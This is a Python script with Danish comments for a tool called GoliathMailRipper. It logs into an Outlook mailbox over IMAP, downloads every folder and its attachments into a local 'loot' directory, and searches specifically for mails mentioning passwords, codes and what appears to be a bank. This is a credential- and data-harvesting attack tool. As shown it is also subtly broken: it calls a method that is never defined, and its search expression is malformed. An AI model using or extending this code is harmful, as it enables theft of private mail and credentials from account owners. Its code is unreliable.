import os
import imaplib
import email
from email.header import decode_header
from core.utils import C

class GoliathMailRipper:
    """Tømmer mailkontoen hurtigt og gemmer alt lokalt (inkl. attachments)."""
    def __init__(self, user, app_password):
        self.user = user
        self.pwd = app_password.replace(" ", "")
        self.host = "imap-mail.outlook.com"
        self.save_dir = os.path.join("loot", f"RIP_{user.split('@')[0]}")

    def run(self):
        print(f"\n{C.CYAN}[18] FORBINDER TIL {self.user}...{C.RESET}")
        try:
            mail = imaplib.IMAP4_SSL(self.host)
            mail.login(self.user, self.pwd)
            
            _, folders = mail.list()
            for f in folders:
                f_name = f.decode().split(' "/" ')[-1].strip('"')
                print(f"[*] Ripper mappe: {f_name}")
                self._rip_folder(mail, f_name)
                
            mail.logout()
            print(f"\n{C.GREEN}[✓] RIP COMPLETE. Data gemt i: {self.save_dir}{C.RESET}")
        except Exception as e:
            if "BasicAuthBlocked" in str(e):
                print(f"{C.RED}[!] FEJL: Microsoft blokerer. Du SKAL bruge 'App Password'.{C.RESET}")
            else:
                print(f"{C.RED}[!] Systemfejl: {e}{C.RESET}")

    # I stedet for at hente 'ALL', beder vi serveren om kun at returnere 
    # mails der indeholder "password", "kode", "lunar" osv.
    def _rip_folder_smart(self, mail, folder):
        mail.select(f'"{folder}"')
        
        # Server-side søgning (Meget hurtigere, sparer båndbredde)
        search_criteria = '(OR OR BODY "password" BODY "kode" BODY "lunar")'
        status, messages = mail.search(None, search_criteria)
        
        if status == 'OK' and messages[0]:
            mail_ids = messages[0].split()
            print(f"[*] Fandt {len(mail_ids)} høj-værdi mails i {folder}. Downloader...")
            for num in mail_ids:
                # Her henter den faktisk mailen og sender den til save_content
                _, data = mail.fetch(num, '(RFC822)')
                msg = email.message_from_bytes(data[0][1])
                self._save_content(msg, folder, num.decode())

    def _save_content(self, msg, folder, mid):
        # Dette er koden du manglede, som faktisk downloader og gemmer mails!
        subject, encoding = decode_header(msg.get("Subject", "Ingen emne"))[0]
        if isinstance(subject, bytes): subject = subject.decode(encoding or "utf-8", errors="ignore")
        
        safe_subject = "".join([c for c in str(subject) if c.isalnum() or c in (' ', '_')]).rstrip()
        folder_path = os.path.join(self.save_dir, folder.replace("/", "_"))
        os.makedirs(folder_path, exist_ok=True)
        
        file_path = os.path.join(folder_path, f"{mid}_{safe_subject[:50]}.txt")
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(f"Fra: {msg.get('From')}\nEmne: {subject}\n{'-'*50}\n")
            if msg.is_multipart():
                for part in msg.walk():
                    if part.get_content_type() == "text/plain":
                        f.write(part.get_payload(decode=True).decode(errors="ignore"))
                    elif part.get_filename(): # Gemmer vedhæftede filer (PDF, billeder etc)
                        attach_dir = os.path.join(folder_path, "attachments")
                        os.makedirs(attach_dir, exist_ok=True)
                        with open(os.path.join(attach_dir, f"{mid}_{part.get_filename()}"), "wb") as af:
                            af.write(part.get_payload(decode=True))
            else:
                f.write(msg.get_payload(decode=True).decode(errors="ignore"))